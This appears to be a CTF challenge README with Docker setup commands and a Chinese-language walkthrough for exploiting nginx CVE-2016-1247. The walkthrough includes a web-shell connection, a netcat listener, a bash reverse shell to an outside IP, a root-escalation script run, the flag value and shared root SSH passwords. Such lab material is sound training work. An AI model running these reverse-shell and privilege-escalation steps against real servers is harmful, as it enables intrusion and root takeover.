
```bash
git clone https://github.com/docimg/ctfshow_docker.git
cd ctfshow_docker/ctfshow_2020_inner_web_03

docker push ctfshow/ctfshow_2020_inner_web_03

git pull
docker build -t ctfshow/ctfshow_2020_inner_web_03 .
docker stop ctfshow_2020_inner_web_03
docker rm ctfshow_2020_inner_web_03
docker run -d --name ctfshow_2020_inner_web_03 -p 8086:80 -e 'FLAG=flag{f3b57619-ceea-4645-a1bd-37a6bf61762e}' ctfshow/ctfshow_2020_inner_web_03

# debug shell
docker exec -it ctfshow_2020_inner_web_03 /bin/bash
```

```
【出题人不想跟你说话.jpg】
描述：
漏洞大约每两分钟触发一次

如果需要反弹shell，且自己没有云服务器的选手，可以使用下面临时环境（随缘重启）
ip | ssh端口 | ssh用户名 | ssh密码 | 反弹shell端口
-|-|-|-|-
212.64.70.228 | 8022 | root | ctfshow | 8888
212.64.70.228 | 9022 | root | ctfshow | 9999
===================================================================
ctfshow/ctfshow_2020_inner_web_03

测试地址：http://149.129.58.154:8086/
CVE-2016-1247
https://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/

密码cai，蚁剑链接，上传nginxed-root.sh
服务器nc监听：nc -lvp 7777
开虚拟终端执行
chmod +x nginxed-root.sh
bash -i >& /dev/tcp/212.64.70.228/9999 0>&1

在反弹的shell里执行
./nginxed-root.sh /var/log/nginx/error.log
等待1分钟左右自动切换到root权限，cat /flag

考察linux服务器基本命令、漏洞搜索/试验能力、服务器远程连接、反弹shell

```

